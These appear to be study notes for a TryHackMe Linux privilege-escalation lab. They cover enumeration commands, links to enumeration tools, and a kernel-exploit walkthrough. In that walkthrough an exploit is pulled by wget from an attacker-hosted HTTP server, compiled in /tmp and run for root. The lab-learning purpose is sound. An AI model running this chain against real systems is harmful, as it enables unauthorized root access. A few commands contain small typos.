# Room
https://tryhackme.com/room/linprivesc

# Task 1 - Intro
Intro

# Task 2 - What is privilege escalation
* privilege escalation involves moving from a lower permission account to a higher permission account
* privilege escalation is the exploitation of a design flaw to gain unauthorized access

# Task 3 - enumeration
* post system access, you'll need to enumerate the machine to figure out if there is any opportunity for privilege escalation
* useful commands to gain info on a system you have access to - these are Linux related
    * hostname - print hostname
    * uname -a - print kernel details
    * cat /proc/version - provides kenerl and process details
    * cat /etc/issue - contains info abuot the OS
    * ps - list system processes
        * ps -A - view all running procs
        * ps axjf - view process tree
        * ps aux - view procs for all users
    * env - view environment variables
    * sudo -l - list the current users sudo privileges
    * ls - list files
    * id - list the uid, gid, and groups that the current user belongs to
    * cat /etc/passwd - a list of users and services on the machine
    * history - view the command history of the current user
    * ifconfig - view network interface configuration
    * ip route - list assigned/configured network routes
    * netstat - list listening and established connections to the machine
        * netstat -at - list IPv4/IPv6 TCP connections
        * netstat -au - list IPv4/IPv6 UDP connections
        * netstat -l - list all listening services
        * netstat -s, netstat -st, netstat -su - list stats for the network, tcp only, udp only
        * netstat -i - show interface stats
    * find - find things on the system
        * find . -name flag1.txt - find the thing named flag1.txt in the current directory
        * find /home -name flag1.txt - find the thing named flag1.txt in the /home directory
        * find / -type d -name config - find the directory named config in the root
        * find / type f -perm 0777 - find files with permissions set to 0777
        * find / -perm a=x - find executable things
        * find /home -user frank - find things that frank owns in the home directory
        * find / -mtime 10 - find things modified in the last 10 days
        * find / -atime 10 - find things that were accessed in the last 10 days
        * find / -cmin -60 - find things changed in the last hour
        * find / -amin -60 - find things accessed in the last hour
        * find / -size 50M - find things with a 50 meg file size
            * you can also use + or - for sizings to find things less than or larger than what you are searching for
        * to avoid all the permissions spam redirect your find commands to null
            * 2> /dev/null

# Task 4 - automated enumeration tools
* a few automated tools
    * https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
    * https://github.com/rebootuser/LinEnum
    * https://github.com/mzet-/linux-exploit-suggester
    * https://github.com/diego-treitos/linux-smart-enumeration
    * https://github.com/linted/linuxprivchecker

# Task 5 - privilege escalation - kernel exploits
* manually exploit a kernel vulnerability
    * connect to the machine using the creds provided
    * recon
        * target: uname -a
    * since we already know this is a kernel vulnerability, search google for the exploit
        * 3.13.0-24-generic exploit
        * https://www.exploit-db.com/exploits/37292
    * Kali has a preconfigured exploit on the attack box, host it up and transfer it to the target
        * attacker: searchsploit -m 37292 .
        * attacker: python -m http.server 9393
        * target: cd /tmp
        * target: wget http://10.10.10.10:9393/37292.c
        * target: gcc 37282.c -o e
        * target: chmod +x e
        * target: ./e
        * target: whoami

# Task 6 - privilege escalation - sudo